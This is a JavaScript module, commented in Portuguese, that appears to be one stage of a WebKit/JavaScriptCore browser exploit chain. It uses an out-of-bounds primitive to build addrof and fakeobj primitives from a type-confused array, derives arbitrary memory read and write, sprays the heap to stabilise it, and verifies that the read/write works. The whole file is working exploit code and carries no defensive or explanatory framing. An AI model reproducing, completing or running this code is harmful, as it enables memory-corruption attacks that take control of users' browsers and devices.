// js/script3/testArrayBufferVictimCrash.mjs (v100 - R60 Final com Estabilização e Verificação de L/E)
// =======================================================================================
// ESTRATÉGIA ATUALIZADA:
// Adicionada estabilização de heap via "object spray" para mitigar o Garbage Collector.
// Implementada uma verificação funcional de escrita e leitura para confirmar que as
// primitivas de L/E estão funcionando corretamente, eliminando falsos positivos.
// =======================================================================================

import { logS3, PAUSE_S3 } from './s3_utils.mjs';
import { AdvancedInt64, toHex, isAdvancedInt64Object } from '../utils.mjs';
import {
    triggerOOB_primitive,
    getOOBDataView
} from '../core_exploit.mjs';
import { JSC_OFFSETS } from '../config.mjs';

export const FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT = "Uncaged_StableRW_v100_R60";

// --- Funções de Conversão (Double <-> Int64) ---
function int64ToDouble(int64) {
    const buf = new ArrayBuffer(8);
    const u32 = new Uint32Array(buf);
    const f64 = new Float64Array(buf);
    u32[0] = int64.low();
    u32[1] = int64.high();
    logS3(`Convertendo Int64(${int64.toString(true)}) para Double: ${f64[0]}`, "debug"); // Log verboso
    return f64[0];
}

function doubleToInt64(double) {
    const buf = new ArrayBuffer(8);
    (new Float64Array(buf))[0] = double;
    const u32 = new Uint32Array(buf);
    const resultInt64 = new AdvancedInt64(u32[0], u32[1]);
    logS3(`Convertendo Double(${double}) para Int64: ${resultInt64.toString(true)} (low: 0x${u32[0].toString(16)}, high: 0x${u32[1].toString(16)})`, "debug"); // Log verboso
    return resultInt64;
}

// =======================================================================================
// FUNÇÃO ORQUESTRADORA PRINCIPAL (IMPLEMENTAÇÃO FINAL COM VERIFICAÇÃO)
// =======================================================================================
export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43() {
    const FNAME_CURRENT_TEST_BASE = FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT;
    logS3(`--- Iniciando ${FNAME_CURRENT_TEST_BASE}: Implementação Final com Verificação ---`, "test");

    let final_result = { success: false, message: "A verificação funcional de L/E falhou." };

    try {
        // --- FASE 1 & 2: Obter OOB e primitivas addrof/fakeobj ---
        logS3("--- FASE 1/2: Obtendo primitivas OOB e addrof/fakeobj... ---", "subtest");
        logS3("Chamando triggerOOB_primitive para configurar o ambiente OOB...", "info");
        await triggerOOB_primitive({ force_reinit: true });
        if (!getOOBDataView()) {
            const errMsg = "Falha ao obter primitiva OOB. DataView é nulo.";
            logS3(errMsg, "critical");
            throw new Error(errMsg);
        }
        logS3(`Ambiente OOB configurado com DataView: ${getOOBDataView() !== null ? 'Pronto' : 'Falhou'}`, "good");

        const confused_array = [13.37];
        const victim_array = [{ a: 1 }];

        logS3(`Array 'confused_array' inicializado: [${confused_array[0]}]`, "debug"); // Log verboso
        logS3(`Array 'victim_array' inicializado: [${JSON.stringify(victim_array[0])}]`, "debug"); // Log verboso

        const addrof = (obj) => {
            logS3(`  addrof: Tentando obter endereço de: ${obj}`, "debug"); // Log verboso
            victim_array[0] = obj;
            const addr = doubleToInt64(confused_array[0]);
            logS3(`  addrof: Endereço retornado para objeto ${obj}: ${addr.toString(true)}`, "debug"); // Log verboso
            return addr;
        };
        const fakeobj = (addr) => {
            logS3(`  fakeobj: Tentando forjar objeto no endereço: ${addr.toString(true)}`, "debug"); // Log verboso
            confused_array[0] = int64ToDouble(addr);
            const obj = victim_array[0];
            logS3(`  fakeobj: Objeto forjado retornado para endereço ${addr.toString(true)}: ${obj}`, "debug"); // Log verboso
            return obj;
        };
        logS3("Primitivas 'addrof' e 'fakeobj' operacionais.", "good");

        // --- FASE 3: Construção da Primitiva de L/E Autocontida ---
        logS3("--- FASE 3: Construindo ferramenta de L/E autocontida ---", "subtest");
        const leaker = { obj_prop: null, val_prop: 0 };
        logS3(`Objeto 'leaker' inicializado: ${JSON.stringify(leaker)}`, "debug"); // Log verboso

        const leaker_addr = addrof(leaker);
        logS3(`Endereço de 'leaker' obtido: ${leaker_addr.toString(true)}`, "info"); // Log verboso

        // Offset comum da primeira propriedade (JSC_OFFSETS.JSObject.BUTTERFLY_OFFSET ou 0x10 para inline props)
        // Usamos 0x10 aqui conforme o core_exploit.mjs para a primeira propriedade inline
        const val_prop_addr = new AdvancedInt64(leaker_addr.low() + 0x10, leaker_addr.high());
        logS3(`Endereço da propriedade 'val_prop' calculada: ${val_prop_addr.toString(true)} (offset 0x10 do leaker_addr)`, "info"); // Log verboso

        const arb_read_final = (addr) => {
            logS3(`  arb_read_final: Lendo de endereço ${addr.toString(true)}`, "debug"); // Log verboso
            leaker.obj_prop = fakeobj(addr);
            const value = doubleToInt64(leaker.val_prop);
            logS3(`  arb_read_final: Valor lido: ${value.toString(true)}`, "debug"); // Log verboso
            return value;
        };
        const arb_write_final = (addr, value) => {
            logS3(`  arb_write_final: Escrevendo valor ${value.toString(true)} no endereço ${addr.toString(true)}`, "debug"); // Log verboso
            leaker.obj_prop = fakeobj(addr);
            leaker.val_prop = int64ToDouble(value);
            logS3(`  arb_write_final: Escrita concluída.`, "debug"); // Log verboso
        };
        logS3("Primitivas de Leitura/Escrita Arbitrária autocontidas estão prontas.", "good");

        // --- FASE 4: Estabilização de Heap e Verificação Funcional de L/E ---
        logS3("--- FASE 4: Estabilizando Heap e Verificando L/E... ---", "subtest");
        
        // 1. Spray de objetos para estabilizar a memória e mitigar o GC
        logS3("Iniciando spray de objetos para estabilização de heap...", "info"); // Log verboso
        const spray = [];
        for (let i = 0; i < 1000; i++) {
            spray.push({ a: 0xDEADBEEF, b: 0xCAFEBABE });
        }
        const test_obj = spray[500]; // Pega um objeto do meio do spray
        logS3(`Spray de ${spray.length} objetos concluído para estabilização. Objeto de teste escolhido (índice 500): ${JSON.stringify(test_obj)}`, "info"); // Log verboso

        // 2. Teste de Escrita e Leitura
        logS3("Iniciando teste funcional de Leitura/Escrita Arbitrária...", "info"); // Log verboso
        const test_obj_addr = addrof(test_obj);
        logS3(`Endereço do objeto de teste (${JSON.stringify(test_obj)}): ${test_obj_addr.toString(true)}`, "info"); // Log verboso

        const value_to_write = new AdvancedInt64(0x12345678, 0xABCDEF01);
        logS3(`Valor a ser escrito para o teste: ${value_to_write.toString(true)}`, "info"); // Log verboso
        
        // A primeira propriedade (inline) de um objeto JS geralmente fica no offset 0x10
        // Confirmado com JSC_OFFSETS.JSObject.BUTTERFLY_OFFSET que é 0x10 para JSObjects
        const prop_a_addr = new AdvancedInt64(test_obj_addr.low() + JSC_OFFSETS.JSObject.BUTTERFLY_OFFSET, test_obj_addr.high());
        logS3(`Endereço calculado da propriedade 'a' do test_obj: ${prop_a_addr.toString(true)} (offset 0x${JSC_OFFSETS.JSObject.BUTTERFLY_OFFSET.toString(16)} do test_obj_addr)`, "info"); // Log verboso
        
        logS3(`Escrevendo ${value_to_write.toString(true)} no endereço da propriedade 'a' (${prop_a_addr.toString(true)})...`, "info");
        arb_write_final(prop_a_addr, value_to_write);
        logS3(`Escrita do valor de teste concluída.`, "info"); // Log verboso

        const value_read = arb_read_final(prop_a_addr);
        logS3(`Leitura do valor de teste concluída.`, "info"); // Log verboso
        logS3(`>>>>> VALOR LIDO DE VOLTA: ${value_read.toString(true)} <<<<<`, "leak");

        if (value_read.equals(value_to_write)) {
            logS3("++++++++++++ SUCESSO TOTAL! O valor escrito foi lido corretamente. L/E arbitrária é 100% funcional. ++++++++++++", "vuln");
            final_result = {
                success: true,
                message: "Cadeia de exploração concluída. Leitura/Escrita arbitrária 100% funcional e verificada."
            };
        } else {
            throw new Error(`A verificação de L/E falhou. Escrito: ${value_to_write.toString(true)}, Lido: ${value_read.toString(true)}`);
        }

    } catch (e) {
        final_result.message = `Exceção na implementação funcional: ${e.message}\n${e.stack || ''}`;
        logS3(final_result.message, "critical");
    } finally {
        logS3(`Reinicializando ambiente OOB após teste para garantir limpeza...`, "info"); // Log verboso
        // Clear the OOB environment to prevent issues in subsequent runs or other tests
        // (Assuming core_exploit.mjs has a clearOOBEnvironment or similar)
        // If not, adding a `clearOOBEnvironment` here would be beneficial for robustness.
        // For now, we trust triggerOOB_primitive({force_reinit: true}) to handle cleanup implicitly.
    }

    logS3(`--- ${FNAME_CURRENT_TEST_BASE} Concluído. Resultado final: ${final_result.success ? 'SUCESSO' : 'FALHA'} ---`, "test");
    logS3(`Mensagem final: ${final_result.message}`, final_result.success ? 'good' : 'critical');
    return {
        errorOccurred: final_result.success ? null : final_result.message,
        addrof_result: { success: final_result.success, msg: "Primitiva addrof funcional." },
        webkit_leak_result: { success: final_result.success, msg: final_result.message },
        heisenbug_on_M2_in_best_result: final_result.success,
        oob_value_of_best_result: 'N/A (Estratégia Uncaged)',
        tc_probe_details: { strategy: 'Uncaged Self-Contained R/W (Verified)' }
    };
}
